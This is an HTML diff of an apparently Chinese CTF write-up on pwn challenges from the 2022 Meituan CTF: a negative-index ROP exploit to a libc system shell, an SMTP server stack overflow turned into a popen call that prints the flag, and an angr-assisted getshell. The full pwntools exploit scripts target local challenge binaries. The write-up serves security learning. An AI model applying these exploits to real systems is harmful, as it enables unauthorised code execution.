@@ -4,30 +4,30 @@
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic01.png" alt="pic01"></p>
 <p>但number为负数时，会对数组反方向的数据进行操作。</p>
 <p>同时，checksec发现PIE和canary保护机制没有开启：</p>
-<pre><code>tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn $ checksec note
-[*] &#39;/home/tolele/CTFgame/2022MTCTF/pwn/note&#39;
+<pre class="line-numbers language-none"><code class="language-none">tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn $ checksec note
+[*] &#39;&#x2F;home&#x2F;tolele&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn&#x2F;note&#39;
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x3ff000)
-</code></pre>
+    PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>那么，可以先试着对堆数组的下边（反方向）查看，看看有没有可利用的东西。</p>
 <p>从IDA可得知：<code>.text:0000000000401714                 call    Edit</code></p>
 <p>我们可以在0x401714处断下，然后用si步入Edit函数，在继续si直到rsp/rbp布置好后，查看栈上的内容：</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic02.png" alt="pic02"></p>
 <p>第一次先泄露出libc基址，第二次再进行getshell。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./note&quot;)
-elf = ELF(&quot;./note&quot;)
-libc = ELF(&quot;./libc-2.31.so&quot;)
+io &#x3D; process(&quot;.&#x2F;note&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;note&quot;)
+libc &#x3D; ELF(&quot;.&#x2F;libc-2.31.so&quot;)
 
-puts_plt = elf.plt[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-pop_rdi_ret = 0x4017b3
-main = 0x401679
+puts_plt &#x3D; elf.plt[&#39;puts&#39;]
+puts_got &#x3D; elf.got[&#39;puts&#39;]
+pop_rdi_ret &#x3D; 0x4017b3
+main &#x3D; 0x401679
 
 def add(size, content):
     io.sendlineafter(&quot;5. leave&quot;, &quot;1&quot;)
@@ -42,99 +42,99 @@ def debug():
     gdb.attach(io)
     pause()
 
-payload = b&#39;A&#39;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
+payload &#x3D; b&#39;A&#39;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
 edit(-6, payload)
-libc_base = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&#39;puts&#39;]
-print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))
+libc_base &#x3D; u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&#39;puts&#39;]
+print(&quot;@@@ libc_base &#x3D; &quot; + str(hex(libc_base)))
 
-system = libc_base + libc.sym[&#39;system&#39;]
-binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
-ret = 0x40101a
-payload = b&#39;A&#39;*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)
+system &#x3D; libc_base + libc.sym[&#39;system&#39;]
+binsh &#x3D; libc_base + libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
+ret &#x3D; 0x40101a
+payload &#x3D; b&#39;A&#39;*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system)
 edit(-6, payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x01：SMTP"><a href="#0x01：SMTP" class="headerlink" title="0x01：SMTP"></a>0x01：SMTP</h2><p>一道stmp的协议逆向题，程序比较大，先执行程序根据信息再进行分析。</p>
-<pre><code>// 执行程序充当服务端
-tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ ./pwn
-listener: waiting for connections...     //连接前就输出的信息
-listener: got connection from 127.0.0.1  //以下为连接后输出的信息
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 执行程序充当服务端
+tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn&#x2F;smtp&#x2F;docker&#x2F;bin $ .&#x2F;pwn
+listener: waiting for connections...     &#x2F;&#x2F;连接前就输出的信息
+listener: got connection from 127.0.0.1  &#x2F;&#x2F;以下为连接后输出的信息
 listener: initiated a new session worker
 session 5: starting work, state 0
-|                          //等待客户端的请求...
+|                          &#x2F;&#x2F;等待客户端的请求...
 
-// 连接,充当客户端
-tolele@tolele-ubuntu22:~/CTFgame/2022MTCTF/pwn/smtp/docker/bin $ nc 127.0.0.1 9999
+&#x2F;&#x2F; 连接,充当客户端
+tolele@tolele-ubuntu22:~&#x2F;CTFgame&#x2F;2022MTCTF&#x2F;pwn&#x2F;smtp&#x2F;docker&#x2F;bin $ nc 127.0.0.1 9999
 220 SMTP tsmtp
-|                          //等待输入请求...
-</code></pre>
+|                          &#x2F;&#x2F;等待输入请求...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>有了这些信息后，接着静态分析程序：</p>
-<pre><code class="c">// main函数
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; main函数
 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
 &#123;
-  if ( argc == 2 )
+  if ( argc &#x3D;&#x3D; 2 )
     listener((char *)argv[1]);
-  listener(&quot;9999&quot;);           //不特定监听端口则默认9999
+  listener(&quot;9999&quot;);           &#x2F;&#x2F;不特定监听端口则默认9999
 &#125;
 
-//listener函数
+&#x2F;&#x2F;listener函数
 void __cdecl __noreturn listener(char *service)
 &#123;
-  // ...略...
-  puts(&quot;listener: waiting for connections...&quot;);  //等待连接（对应已获取的信息）
-  epfd = epoll_create(16);
-  event.data.fd = fd;
-  event.events = 1;
+  &#x2F;&#x2F; ...略...
+  puts(&quot;listener: waiting for connections...&quot;);  &#x2F;&#x2F;等待连接（对应已获取的信息）
+  epfd &#x3D; epoll_create(16);
+  event.data.fd &#x3D; fd;
+  event.events &#x3D; 1;
   epoll_ctl(epfd, 1, fd, &amp;event);
-  events = (struct epoll_event *)calloc(0x10u, 0xCu);
+  events &#x3D; (struct epoll_event *)calloc(0x10u, 0xCu);
   while ( 1 )
   &#123;
-    v12 = epoll_wait(epfd, events, 1, -1);
-    for ( i = 0; i &lt; v12; ++i )
+    v12 &#x3D; epoll_wait(epfd, events, 1, -1);
+    for ( i &#x3D; 0; i &lt; v12; ++i )
     &#123;
-      if ( fd == events[i].data.fd )
+      if ( fd &#x3D;&#x3D; events[i].data.fd )
       &#123;
-        addr_len = 128;
-        v11 = accept(fd, &amp;addr, &amp;addr_len);
-        v1 = (const void *)get_in_addr(&amp;addr);
+        addr_len &#x3D; 128;
+        v11 &#x3D; accept(fd, &amp;addr, &amp;addr_len);
+        v1 &#x3D; (const void *)get_in_addr(&amp;addr);
         inet_ntop(addr.sa_family, v1, buf, 0x2Eu);
-        printf(&quot;listener: got connection from %s\n&quot;, buf); //连接
-        arg = malloc(0x14u);
-        *(_DWORD *)arg = v11;
-        *((_DWORD *)arg + 1) = 0;
-        pthread_create(&amp;newthread, 0, (void *(*)(void *))session_worker, arg); //创建线程,去执行session_work函数
+        printf(&quot;listener: got connection from %s\n&quot;, buf); &#x2F;&#x2F;连接
+        arg &#x3D; malloc(0x14u);
+        *(_DWORD *)arg &#x3D; v11;
+        *((_DWORD *)arg + 1) &#x3D; 0;
+        pthread_create(&amp;newthread, 0, (void *(*)(void *))session_worker, arg); &#x2F;&#x2F;创建线程,去执行session_work函数
         puts(&quot;listener: initiated a new session worker&quot;);
       &#125;
     &#125;
   &#125;
 &#125;
 
-// session_worker函数
+&#x2F;&#x2F; session_worker函数
 void *__cdecl session_worker(int *a1)
 &#123;
-  // ...略...
-  v35 = a1;
-  fd = *a1;
+  &#x2F;&#x2F; ...略...
+  v35 &#x3D; a1;
+  fd &#x3D; *a1;
   session_reset(a1);
   printf(&quot;session %d: starting work, state %d\n&quot;, fd, a1[1]);
-  v1 = strlen(off_804D0A0[0]);
+  v1 &#x3D; strlen(off_804D0A0[0]);
   send(fd, off_804D0A0[0], v1, 0);
-  // ...略...
-  while ( v35[1] != 5 )
+  &#x2F;&#x2F; ...略...
+  while ( v35[1] !&#x3D; 5 )
   &#123;
-    v29 = epoll_wait(epfd, events, 1, timeout);
+    v29 &#x3D; epoll_wait(epfd, events, 1, timeout);
     if ( !v29 )
     &#123;
       close(fd);
       printf(&quot;session %d: timeout, work is over\n&quot;, fd);
       break;
     &#125;
-    if ( v29 == 1 )
+    if ( v29 &#x3D;&#x3D; 1 )
     &#123;
       memset(s, 0, 0x400u);
-      v28 = recv(fd, s, nmemb - 1, 0);   //接收到请求，赋给s
+      v28 &#x3D; recv(fd, s, nmemb - 1, 0);   &#x2F;&#x2F;接收到请求，赋给s
       if ( !v28 )
       &#123;
         printf(&quot;session %d: client closed connection\n&quot;, fd);
@@ -145,99 +145,99 @@ void *__cdecl session_worker(int *a1)
         printf(&quot;session %d: recv error\n&quot;, fd);
         break;
       &#125;
-      ptr = (void *)parse_request((char *)s);  //解析请求
-      if ( v35[1] != 4 || *(_DWORD *)ptr == 4 )
+      ptr &#x3D; (void *)parse_request((char *)s);  &#x2F;&#x2F;解析请求
+      if ( v35[1] !&#x3D; 4 || *(_DWORD *)ptr &#x3D;&#x3D; 4 )
       &#123;
-        if ( v35[1] == 4 &amp;&amp; *(_DWORD *)ptr == 4 &amp;&amp; strlen((const char *)s) &gt; 3 )
+        if ( v35[1] &#x3D;&#x3D; 4 &amp;&amp; *(_DWORD *)ptr &#x3D;&#x3D; 4 &amp;&amp; strlen((const char *)s) &gt; 3 )
         &#123;
           if ( *(_DWORD *)(v35[4] + 8) )
           &#123;
-            v7 = strlen((const char *)s);
-            v24 = v7 + strlen(*(const char **)(v35[4] + 8)) + 1;
-            v23 = (char *)malloc(v24);
-            v8 = strlen(*(const char **)(v35[4] + 8));
+            v7 &#x3D; strlen((const char *)s);
+            v24 &#x3D; v7 + strlen(*(const char **)(v35[4] + 8)) + 1;
+            v23 &#x3D; (char *)malloc(v24);
+            v8 &#x3D; strlen(*(const char **)(v35[4] + 8));
             strncpy(v23, *(const char **)(v35[4] + 8), v8 + 1);
-            v9 = strlen((const char *)s);
+            v9 &#x3D; strlen((const char *)s);
             strncat(v23, (const char *)s, v9 - 5);
-            v23[v24] = 0;
+            v23[v24] &#x3D; 0;
             free(*(void **)(v35[4] + 8));
-            *(_DWORD *)(v35[4] + 8) = v23;
+            *(_DWORD *)(v35[4] + 8) &#x3D; v23;
           &#125;
           else
           &#123;
-            v6 = v35[4];
-            *(_DWORD *)(v6 + 8) = strdup((const char *)s);
+            v6 &#x3D; v35[4];
+            *(_DWORD *)(v6 + 8) &#x3D; strdup((const char *)s);
           &#125;
           if ( *((_DWORD *)ptr + 1) )
             free(*((void **)ptr + 1));
         &#125;
         switch ( *(_DWORD *)ptr )
         &#123;
-          case 0:       // HELO
+          case 0:       &#x2F;&#x2F; HELO
             session_reset(v35);
             if ( !v35[1] )
             &#123;
-              v10 = strlen(server_replies[0]);
+              v10 &#x3D; strlen(server_replies[0]);
               send(fd, server_replies[0], v10, 0);
             &#125;
-            v35[1] = 1;
-            v11 = strdup(*((const char **)ptr + 1));
-            v35[3] = (int)v11;
+            v35[1] &#x3D; 1;
+            v11 &#x3D; strdup(*((const char **)ptr + 1));
+            v35[3] &#x3D; (int)v11;
             printf(&quot;session %d: state changed to greeted\n&quot;, fd);
             break;
-          case 1:       // MAIL FROM:
-            if ( v35[1] != 1 )
+          case 1:       &#x2F;&#x2F; MAIL FROM:
+            if ( v35[1] !&#x3D; 1 )
               goto LABEL_41;
-            v35[1] = 2;
-            v12 = (char **)v35[4];
-            *v12 = strdup(*((const char **)ptr + 1));
-            v13 = strlen(server_replies[0]);
+            v35[1] &#x3D; 2;
+            v12 &#x3D; (char **)v35[4];
+            *v12 &#x3D; strdup(*((const char **)ptr + 1));
+            v13 &#x3D; strlen(server_replies[0]);
             send(fd, server_replies[0], v13, 0);
             printf(&quot;session %d: got mail from\n&quot;, fd);
             break;
-          case 2:       // RCPT TO:
-            if ( v35[1] != 2 &amp;&amp; v35[1] != 3 )
+          case 2:       &#x2F;&#x2F; RCPT TO:
+            if ( v35[1] !&#x3D; 2 &amp;&amp; v35[1] !&#x3D; 3 )
               goto LABEL_41;
-            v35[1] = 3;
-            v14 = v35[4];
-            *(_DWORD *)(v14 + 4) = strdup(*((const char **)ptr + 1));// 重点
-            v15 = strlen(server_replies[0]);
+            v35[1] &#x3D; 3;
+            v14 &#x3D; v35[4];
+            *(_DWORD *)(v14 + 4) &#x3D; strdup(*((const char **)ptr + 1));&#x2F;&#x2F; 重点
+            v15 &#x3D; strlen(server_replies[0]);
             send(fd, server_replies[0], v15, 0);
             printf(&quot;session %d: state changed to got receipients\n&quot;, fd);
             break;
-          case 3:       // DATA
-            if ( v35[1] != 3 )
+          case 3:       &#x2F;&#x2F; DATA
+            if ( v35[1] !&#x3D; 3 )
               goto LABEL_41;
-            v35[1] = 4;
-            v16 = strlen(off_804D0A8[0]);
+            v35[1] &#x3D; 4;
+            v16 &#x3D; strlen(off_804D0A8[0]);
             send(fd, off_804D0A8[0], v16, 0);
             printf(&quot;session %d: state changed to data receival\n&quot;, fd);
             break;
-          case 4:       // .\r\n
-            if ( v35[1] == 4 )
+          case 4:       &#x2F;&#x2F; .\r\n
+            if ( v35[1] &#x3D;&#x3D; 4 )
             &#123;
               session_submit(v35);
               session_reset(v35);
-              v35[1] = 1;
-              v17 = strlen(server_replies[0]);
+              v35[1] &#x3D; 1;
+              v17 &#x3D; strlen(server_replies[0]);
               send(fd, server_replies[0], v17, 0);
               printf(&quot;session %d: data transaction over, state changed to greeted\n&quot;, fd);
             &#125;
             else
             &#123;
 LABEL_41:
-              v18 = strlen(off_804D0B0);
+              v18 &#x3D; strlen(off_804D0B0);
               send(fd, off_804D0B0, v18, 0);
             &#125;
             break;
           case 5:
-            v35[1] = 5;
-            v19 = strlen(off_804D0AC[0]);
+            v35[1] &#x3D; 5;
+            v19 &#x3D; strlen(off_804D0AC[0]);
             send(fd, off_804D0AC[0], v19, 0);
             printf(&quot;session %d: state changed to quit\n&quot;, fd);
             break;
           default:
-            v20 = strlen(off_804D0A4[0]);
+            v20 &#x3D; strlen(off_804D0A4[0]);
             send(fd, off_804D0A4[0], v20, 0);
             printf(&quot;session %d: syntax error\n&quot;, fd);
             break;
@@ -245,7 +245,7 @@ LABEL_41:
       &#125;
       else
       &#123;
-       //...略...
+       &#x2F;&#x2F;...略...
       &#125;
       free(ptr);
     &#125;
@@ -255,38 +255,38 @@ LABEL_41:
   printf(&quot;session %d: finished\n&quot;, fd);
   close(fd);
   return 0;
-&#125;
-</code></pre>
-<pre><code class="c">// 请求解析函数,parse_request
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; 请求解析函数,parse_request
 _DWORD *__cdecl parse_request(char *s)
 &#123;
-  char *argument_string_start; // [esp+4h] [ebp-14h]
-  char *ptr; // [esp+8h] [ebp-10h]
-  _DWORD *v4; // [esp+Ch] [ebp-Ch]
+  char *argument_string_start; &#x2F;&#x2F; [esp+4h] [ebp-14h]
+  char *ptr; &#x2F;&#x2F; [esp+8h] [ebp-10h]
+  _DWORD *v4; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]
 
-  v4 = malloc(8u);
-  *v4 = get_session_command(s);
-  if ( *v4 == -1 )
+  v4 &#x3D; malloc(8u);
+  *v4 &#x3D; get_session_command(s);
+  if ( *v4 &#x3D;&#x3D; -1 )
   &#123;
-    v4[1] = 0;
+    v4[1] &#x3D; 0;
     return v4;
   &#125;
   else
   &#123;
-    v4[1] = 0;
-    ptr = strdup(s);
-    argument_string_start = (char *)get_argument_string_start(ptr, *v4);
+    v4[1] &#x3D; 0;
+    ptr &#x3D; strdup(s);
+    argument_string_start &#x3D; (char *)get_argument_string_start(ptr, *v4);
     if ( *argument_string_start )
-      v4[1] = strdup(argument_string_start);
+      v4[1] &#x3D; strdup(argument_string_start);
     free(ptr);
     return v4;
   &#125;
 &#125;
 
-// 对应的请求命令
+&#x2F;&#x2F; 对应的请求命令
 int __cdecl get_session_command(char *s1)
 &#123;
-  size_t v2; // eax
+  size_t v2; &#x2F;&#x2F; eax
 
   if ( !strncmp(s1, &quot;HELO&quot;, 4u) )
     return 0;
@@ -298,46 +298,46 @@ int __cdecl get_session_command(char *s1)
     return 3;
   if ( !strncmp(s1, &quot;.\r\n&quot;, 3u) )
     return 4;
-  v2 = strlen(s1);
+  v2 &#x3D; strlen(s1);
   if ( !strncmp(&amp;s1[v2 - 5], &quot;\r\n.\r\n&quot;, 5u) )
     return 4;
   if ( !strncmp(s1, &quot;QUIT&quot;, 4u) )
     return 5;
   return -1;
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>通过对这几个case代码审计，发现漏洞存在case 4的session_submit函数中的sender_worker中。</p>
-<pre><code class="c">// session_submit函数
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; session_submit函数
 int __cdecl session_submit(_DWORD *a1)
 &#123;
-  pthread_t newthread[2]; // [esp+Ch] [ebp-Ch] BYREF
+  pthread_t newthread[2]; &#x2F;&#x2F; [esp+Ch] [ebp-Ch] BYREF
 
   printf(&quot;session %d: received message &#39;%s&#39;\n&quot;, *a1, *(const char **)(a1[4] + 8));
   printf(&quot;session %d: handing off message to sender\n&quot;, *a1);
   return pthread_create(newthread, 0, sender_worker, (void *)a1[4]);
 &#125;
 
-// sender_worker函数
+&#x2F;&#x2F; sender_worker函数
 void *__cdecl sender_worker(const char **a1)
 &#123;
-  char s[256]; // [esp+Ch] [ebp-10Ch] BYREF
-  const char **v3; // [esp+10Ch] [ebp-Ch]
+  char s[256]; &#x2F;&#x2F; [esp+Ch] [ebp-10Ch] BYREF
+  const char **v3; &#x2F;&#x2F; [esp+10Ch] [ebp-Ch]
 
   puts(&quot;sender: starting work&quot;);
-  v3 = a1;
-  len = strlen(a1[1]);
+  v3 &#x3D; a1;
+  len &#x3D; strlen(a1[1]);
   puts(&quot;sender: sending message....&quot;);
   printf(&quot;sender: FROM: %s\n&quot;, *a1);
-  if ( strlen(*a1) &lt;= 79 )
-    strcpy(from, *v3);     //from:0x0804d140
-  if ( len &lt;= 0xFFu )   
+  if ( strlen(*a1) &lt;&#x3D; 79 )
+    strcpy(from, *v3);     &#x2F;&#x2F;from:0x0804d140
+  if ( len &lt;&#x3D; 0xFFu )   
   &#123;
     printf(&quot;sender: TO: %s\n&quot;, v3[1]);
   &#125;
   else
   &#123;
     memset(s, 0, sizeof(s));
-    strcpy(s, v3[1]);      //直接拷贝,存在溢出
+    strcpy(s, v3[1]);      &#x2F;&#x2F;直接拷贝,存在溢出
     printf(&quot;sender: TO: %s\n&quot;, s);
   &#125;
   puts(&quot;sender: BODY:&quot;);
@@ -348,30 +348,30 @@ void *__cdecl sender_worker(const char **a1)
   putchar(10);
   puts(&quot;sender: finished&quot;);
   return 0;
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>现在知道了在sender_worker中，v3[1]会导致栈溢出。我们还需要知道v3[1]对应的是哪个命令的数据，我们可以逐函数反推。反推可得v3[1]是”RCPT TO:”后面接着的数据，但其需要最后处理.\r\n时才能触发。</p>
 <p>popen函数可以执行任意可执行命令，我们可以在MAIL FROM:后添加数据，向bss段写入”cat flag &gt;&amp;5”，然后使用popen(“cat flag &gt;&amp;5”, “r”)读取flag。&gt;&amp;5是需要重定向，具体的值需要一个个试。</p>
 <p>理论上：payload = b’a’ * 0x110 + p32(elf.plt[‘popen’]) + p32(0xdeadbeef) + p32(bss) + p32(read)</p>
 <p>但执行过程发现crash了，调试发现，程序断在了这里：</p>
 <p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic03.png" alt="pic03"></p>
 <p>原因是上一步把’aaaa’传给了eax，导致下个指令对一个无效地址进行访问，导致了SIGSEGV。所以我们需要在[ebp - 0xc]处给个有效地址。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;i386&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = remote(&quot;127.0.0.1&quot;, 9999)
-elf = ELF(&quot;./pwn&quot;)
+io &#x3D; remote(&quot;127.0.0.1&quot;, 9999)
+elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)
 
 io.sendlineafter(b&#39;220 SMTP tsmtp&#39;, b&#39;HELO&#39;)
 io.sendlineafter(b&#39;250 Ok&#39;, b&#39;MAIL FROM:&#39; + b&#39;cat flag &gt;&amp;5&#39;)   # shellcode
-read = elf.search(b&#39;r\x00&#39;).__next__()
-bss = 0x0804D140
-payload = b&#39;a&#39; * 0x100 + p32(0x08049024) + b&#39;a&#39; * 0xc + p32(elf.plt[&#39;popen&#39;]) + p32(0xdeadbeef) + p32(bss) + p32(read)
+read &#x3D; elf.search(b&#39;r\x00&#39;).__next__()
+bss &#x3D; 0x0804D140
+payload &#x3D; b&#39;a&#39; * 0x100 + p32(0x08049024) + b&#39;a&#39; * 0xc + p32(elf.plt[&#39;popen&#39;]) + p32(0xdeadbeef) + p32(bss) + p32(read)
 io.sendlineafter(b&#39;250 Ok&#39;, b&#39;RCPT TO:&#39; + payload)
 io.sendlineafter(b&#39;250 Ok&#39;, b&#39;DATA&#39; + b&#39;bbbb&#39;)
 io.sendline(b&#39;.\r\n&#39;)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x02：捉迷藏"><a href="#0x02：捉迷藏" class="headerlink" title="0x02：捉迷藏"></a>0x02：捉迷藏</h2><p>下面是程序的函数调用关系图，这样一看，倒不算是太复杂。但点进main函数一看，💩💩💩。</p>
@@ -387,97 +387,97 @@ io.interactive()
 <p>我们首先通过angr找到能执行到该路径的符号变量，然后添加能执行getshell的约束，当符号变量满足时，发送数据去getshell（噢~这糟糕的表达🤧）。因为程序执行过程中<code>fksth</code>、<code>input_line</code>和<code>input_val</code>函数会大量执行，且其内部含有循环，为了防止探索过程中路径爆炸，需要编写相应的hook函数对其替代。具体的hook函数见exp中的<code>ReplacementCheckEquals</code>、<code>ReplacementInputVal</code>和<code>ReplacementCheckInput</code>函数。至于文中state的<code>unconstrained</code>，个人理解是保存需要用户输入的路径。</p>
 <p>本题的一个疑惑点是add_constraints函数具体做了什么？d = simgr.explore()之后，d.unconstrained是固定的了，那每个路径约束的符号变量会不会是多个呢？如果是单个的话，显然后面的添加的约束就没有意义了。还有就是添加的约束是要求对地址绝对的符合，如果符号变量的随机模拟的，岂不是相当于爆破？不过，执行exp很快就有结果了，个人猜测：某次检查符号变量不满足那两个约束后，下一次生成符号变量时，angr会不会有什么机制根据上一次的受阻约束来进行调整，从而生成满足这两个约束的符号变量。</p>
 <p>看来还得深入了解~</p>
-<pre><code class="python"># 来自toka师傅的exp
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"># 来自toka师傅的exp
 # ipython3 exp.py
 from pwn import *
 import angr
 import claripy
 import base64
-ret_rop = 0x4013C8
+ret_rop &#x3D; 0x4013C8
  
-r=process(&quot;./pwn&quot;)
+r&#x3D;process(&quot;.&#x2F;pwn&quot;)
  
-p = angr.Project(&quot;./pwn&quot;)
+p &#x3D; angr.Project(&quot;.&#x2F;pwn&quot;)
  
-def getBVV(state, sizeInBytes, type = &#39;str&#39;):
+def getBVV(state, sizeInBytes, type &#x3D; &#39;str&#39;):
     global pathConditions
-    name = &#39;s_&#39; + str(state.globals[&#39;symbols_count&#39;])
-    bvs = claripy.BVS(name, sizeInBytes * 8)
-    state.globals[&#39;symbols_count&#39;] += 1
-    state.globals[name] = (bvs, type)
+    name &#x3D; &#39;s_&#39; + str(state.globals[&#39;symbols_count&#39;])
+    bvs &#x3D; claripy.BVS(name, sizeInBytes * 8)
+    state.globals[&#39;symbols_count&#39;] +&#x3D; 1
+    state.globals[name] &#x3D; (bvs, type)
     return bvs
  
 def angr_load_str(state, addr):
-    s, i = &#39;&#39;, 0
+    s, i &#x3D; &#39;&#39;, 0
     while True:
-        ch = state.solver.eval(state.memory.load(addr + i, 1))
-        if ch == 0: break
-        s += chr(ch)
-        i += 1
+        ch &#x3D; state.solver.eval(state.memory.load(addr + i, 1))
+        if ch &#x3D;&#x3D; 0: break
+        s +&#x3D; chr(ch)
+        i +&#x3D; 1
     return s
  
 class ReplacementCheckEquals(angr.SimProcedure):
     def run(self, str1, str2):
-        cmp1 = angr_load_str(self.state, str2).encode(&quot;ascii&quot;)
-        cmp0 = self.state.memory.load(str1, len(cmp1))
-        self.state.regs.rax = claripy.If(cmp1 == cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))
+        cmp1 &#x3D; angr_load_str(self.state, str2).encode(&quot;ascii&quot;)
+        cmp0 &#x3D; self.state.memory.load(str1, len(cmp1))
+        self.state.regs.rax &#x3D; claripy.If(cmp1 &#x3D;&#x3D; cmp0, claripy.BVV(0, 32), claripy.BVV(1, 32))
  
 class ReplacementCheckInput(angr.SimProcedure):
     def run(self, buf, len):
-        len = self.state.solver.eval(len)
+        len &#x3D; self.state.solver.eval(len)
         self.state.memory.store(buf, getBVV(self.state, len))
  
 class ReplacementInputVal(angr.SimProcedure):
     def run(self):
-        self.state.regs.rax = getBVV(self.state, 4, &#39;int&#39;) 
+        self.state.regs.rax &#x3D; getBVV(self.state, 4, &#39;int&#39;) 
  
  
 p.hook_symbol(&quot;fksth&quot;, ReplacementCheckEquals())
 p.hook_symbol(&quot;input_line&quot;, ReplacementCheckInput())
